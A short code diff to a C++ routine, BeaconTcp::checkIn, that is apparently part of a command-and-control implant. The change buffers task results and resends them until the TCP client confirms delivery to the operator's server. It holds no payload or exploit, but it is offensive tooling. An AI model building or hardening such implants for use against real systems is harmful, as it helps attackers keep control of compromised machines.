@@ -29,13 +29,17 @@ void BeaconTcp::checkIn()
 
     if(ret)
     {
-        std::string output;
-        taskResultsToCmd(output);
-
-        output.append(TcpFrameBuffer::delimiter());
+        if (m_pendingOutput.empty())
+        {
+            taskResultsToCmd(m_pendingOutput);
+            m_pendingOutput.append(TcpFrameBuffer::delimiter());
+        }
 
         std::string input;
-        int res = m_client->process(output, input);
+        bool wasSent = false;
+        int res = m_client->process(m_pendingOutput, input, &wasSent);
+        if (wasSent)
+            m_pendingOutput.clear();
 
         if(res<=0)
         {
